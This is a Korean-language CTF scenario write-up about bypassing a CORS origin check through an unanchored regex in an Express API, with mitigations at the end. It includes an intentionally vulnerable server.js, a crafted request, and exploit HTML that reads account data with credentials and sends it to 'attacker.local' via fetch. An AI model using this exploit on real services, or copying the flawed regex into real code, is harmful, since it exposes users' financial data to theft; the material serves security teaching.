---
title: CORS Origin Validation Bypass via Regex Flaw — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, cors, regex-bypass, misconfiguration, data-exfiltration, origin-validation]
confidence: high
---

# CORS Origin Validation Bypass via Regex Flaw — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Financial Account API (금융 계좌 조회 허브)
- **난이도**: Medium
- **핵심 컨셉**: 교차 출처 리소스 공유(CORS) 정책 구현 시 잘못 구성된 **정규표현식 검증 로직**으로 인해 발생하는 **CORS Origin 우회 및 데이터 탈취** 취약점 문제입니다. 대상 애플리케이션은 자사의 신뢰 관계에 있는 파트너 도메인(`trusted-partner.local`)의 브라우저 스크립트가 금융 데이터를 조회할 수 있도록 동적으로 `Access-Control-Allow-Origin`을 요청 헤더의 `Origin` 값으로 설정해 주는 미들웨어를 구축했습니다. 그러나 `Origin` 도메인이 신뢰 도메인인지 확인하는 백엔드 정규식이 불완전(도트(`.`) 문자 이스케이프 미흡, 도메인 후방 바인딩 누락 등)하여, 공격자는 특수 설계된 서브도메인을 개설해 CORS 인증 통제를 무력화하고 피해자의 자산 기밀 정보를 탈취합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Target Financial Service (`/api/accounts`)**:
  - 금융 계좌 내역 및 기밀 사용자 프로필을 반환하는 핵심 API 엔드포인트.
  - CORS 동적 인증 처리 및 `Access-Control-Allow-Credentials: true`가 적용된 정책 보유.
- **Flag 위치**:
  - `/api/accounts` 조회 결과 응답 내에 포함된 중요 잔액 데이터 영역의 문자열.

### 2.2 취약점 지점
1. **Flawed Regex Validation for Allowed Origins**:
   - 백엔드는 클라이언트가 보낸 `req.headers.origin` 값을 검증하기 위해 다음과 같은 정규표현식을 사용합니다:
     `/https?:\/\/(.*)trusted-partner.local/i` 또는 `/trusted-partner\.local/`
   - **오류 분석**:
     - 정규식의 점(`.`)은 임의의 단일 문자로 치환될 수 있습니다. (예: `trusted-partneralocal` 등)
     - 도메인 후방 앵커 기호(`$`)가 없기 때문에 `trusted-partner.local.attacker.com`과 같은 도메인이 정규식 평가를 통과합니다.
     - 도메인 전방 경계 검사 실패로 인해 `fake-trusted-partner.local` 또한 참(True)으로 평가될 수 있습니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 요청 헤더 | 반환 CORS 헤더 특징 |
|------------|--------|------|-----------|---------------------|
| `/api/accounts` | GET | 세션 필요 | `Origin: http://trusted-partner.local.attacker.local` | `Access-Control-Allow-Origin` 동적 바인딩 및 `Credentials: true` |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. CORS 정책 매핑 관찰
공격자는 타겟 API에 임의의 `Origin`을 보내 어떻게 응답 헤더가 변화하는지 진단합니다.
- `Origin: http://attacker.local` 전송 -> CORS 헤더 미반환.
- `Origin: http://trusted-partner.local` 전송 -> 정상적으로 아래의 헤더 반환:
  ```http
  Access-Control-Allow-Origin: http://trusted-partner.local
  Access-Control-Allow-Credentials: true
  ```

### Step 2. 정규식 우회 도메인 유추 및 도킹
서버가 사용 중인 정규식이 `/trusted-partner\.local/` 와 같이 단순 포함 관계만 체크하는 불완전한 형식임을 눈치챕니다.
- **우회 공격 도메인 기법**:
  1. 공격자가 통제할 수 있는 도메인의 서브도메인을 아래와 같이 셋업합니다.
     `http://trusted-partner.local.attacker.local`
  2. 이 주소를 `Origin` 헤더에 담아 타겟 서버로 전송합니다.
- **요청 패킷**:
  ```http
  GET /api/accounts HTTP/1.1
  Host: api.bank.local
  Origin: http://trusted-partner.local.attacker.local
  Cookie: session=victim_session_cookie
  ```
- **응답 헤더**:
  ```http
  Access-Control-Allow-Origin: http://trusted-partner.local.attacker.local
  Access-Control-Allow-Credentials: true
  ```
  서버의 정규표현식이 `trusted-partner.local` 문자열이 내포되어 있다는 이유로 이를 올바른 출처로 판별해 버립니다.

### Step 3. 데이터 하이재킹 HTML 작성
1. 공격자는 `http://trusted-partner.local.attacker.local/exploit.html` 경로에 아래의 공격용 자바스크립트를 배치합니다.
   - **스크립트**:
     ```html
     <script>
         var xhr = new XMLHttpRequest();
         xhr.withCredentials = true;
         xhr.open('GET', 'http://api.bank.local/api/accounts', true);
         xhr.onload = function() {
             // 획득한 금융 자산 및 플래그를 탈취 로그 리시버로 송출
             fetch('http://attacker.local/log?data=' + btoa(xhr.responseText));
         };
         xhr.send();
     </script>
     ```

### Step 4. 피해자 유도 및 flag 획득
1. 이 주소 링크를 피해자 봇(Admin/User Bot)에게 보냅니다.
2. 봇이 링크를 열면, 해당 사이트에서 실행된 스크립트가 브라우저의 Credentials(세션 쿠키)와 함께 `api.bank.local/api/accounts`를 성공적으로 비동기 호출합니다.
3. 브라우저는 `Access-Control-Allow-Origin`이 요청 오리진인 `trusted-partner.local.attacker.local`과 정확히 일치하므로 응답 데이터 접근 권한을 획득하고, 공격자의 로거로 데이터를 송출합니다.
4. 공격자는 유출된 로그 데이터를 해독하여 플래그(`FLAG{cors_regex_insufficient_anchor_bypass}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js Express)

```javascript
// server.js (취약한 CORS 정규식 검증 예시)
const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();

app.use(cookieParser());

app.use((req, res, next) => {
    const origin = req.headers.origin;
    
    if (origin) {
        // 취약점 지점: 정규표현식에 도메인 문자열 이탈을 막는 앵커(^와 $) 처리가 미흡함
        // trusted-partner.local 로 끝나거나 시작하는 부분 검증 없이 포함만 되어도 통과
        // 예: 'http://trusted-partner.local.attacker.local' 도 통과됨
        if (/trusted-partner\.local/.test(origin)) {
            res.setHeader('Access-Control-Allow-Origin', origin);
            res.setHeader('Access-Control-Allow-Credentials', 'true');
            res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
            res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Cookie');
        }
    }
    
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.get('/api/accounts', (req, res) => {
    // 세션 쿠키 인증 및 계정 기밀 덤프
    const session = req.cookies.session;
    if (session === "user_session_token_xyz") {
        return res.json({
            account_owner: "Alice",
            balance: "$1,500,000",
            secret_flag: "FLAG{cors_regex_insufficient_anchor_bypass}"
        });
    }
    return res.status(401).json({ error: "Unauthorized" });
});

app.listen(8080);
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **엄격한 앵커 결합형 정규표현식 수립**:
   - 정규표현식 작성 시 도메인의 시작과 끝을 규정하는 앵커 기호(`^` 및 `$`)와 프로토콜 포트 경계를 절대 생략하지 말고 정의합니다.
     ```javascript
     // 수정된 안전한 정규식 예시
     // trusted-partner.local 도메인 혹은 그 서브도메인만 정확히 허용
     const safeRegex = /^https?:\/\/(?:[a-zA-Z0-9-]+\.)*trusted-partner\.local$/;
     if (safeRegex.test(origin)) { ... }
     ```
2. **정적 배열 1:1 비교 화이트리스트 검사 (Static Array Matching)**:
   - 실수하기 쉬운 정규표현식 대신, 명확하게 허용할 도메인 주소들을 정적 배열 자료 구조에 담아두고 클라이언트 오리진과 완전 1대1 비교(`===`)를 통하여 통제합니다.
3. **CORS credentials 필요성 진단**:
   - 크로스 오리진 간 쿠키 및 인증 토큰 전달(`Access-Control-Allow-Credentials: true`)을 요구하지 않는 구조라면 이를 비활성화하여, XSS나 CORS 하이재킹에 의한 임의 세션 도용 행위를 원천 방어합니다.
